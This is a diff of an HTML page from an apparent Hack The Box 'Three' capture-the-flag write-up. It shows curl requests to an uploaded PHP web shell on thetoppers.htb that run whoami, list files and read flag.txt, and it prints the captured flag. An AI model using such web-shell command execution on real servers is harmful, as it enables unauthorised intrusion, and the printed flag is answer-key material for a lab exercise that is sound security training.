@@ -74,7 +74,7 @@ NMAP Scanning:┌──(kali㉿kali)-[~/Desktop/Workspace/HTB/starting]└─$ s
 
 <p>Check if the file has been uploaded:</p>
 <p><img src="/../Three_img/12.png" alt="alt text"></p>
-<p>Now we use curl :</p>
+<p>Now we use curl to get the flag:</p>
 <figure class="highlight powershell"><table><tr><td class="code"><pre><code class="hljs powershell">┌──(kali㉿kali)-[~]<br>└─<span class="hljs-variable">$</span> <span class="hljs-built_in">curl</span> <span class="hljs-string">&quot;http://thetoppers.htb/shell.php?cmd=whoami&quot;</span><br><br><span class="hljs-comment"># Take input from the url paramter. shell.php?cmd=whoami</span><br>www<span class="hljs-literal">-data</span><br><br>┌──(kali㉿kali)-[~]<br>└─<span class="hljs-variable">$</span> <span class="hljs-built_in">curl</span> <span class="hljs-string">&quot;http://thetoppers.htb/shell.php?cmd=ls+../&quot;</span><br><br><span class="hljs-comment"># Take input from the url paramter. shell.php?cmd=whoami</span><br>flag.txt<br>html<br><br>┌──(kali㉿kali)-[~]<br>└─<span class="hljs-variable">$</span> <span class="hljs-built_in">curl</span> <span class="hljs-string">&quot;http://thetoppers.htb/shell.php?cmd=cat+../flag.txt&quot;</span><br><br><span class="hljs-comment"># Take input from the url paramter. shell.php?cmd=whoami</span><br>a980d99281a28d638ac68b9bf9453c2b<br><br></code></pre></td></tr></table></figure>
 
 <p>FLAG : <code>a980d99281a28d638ac68b9bf9453c2b</code></p>
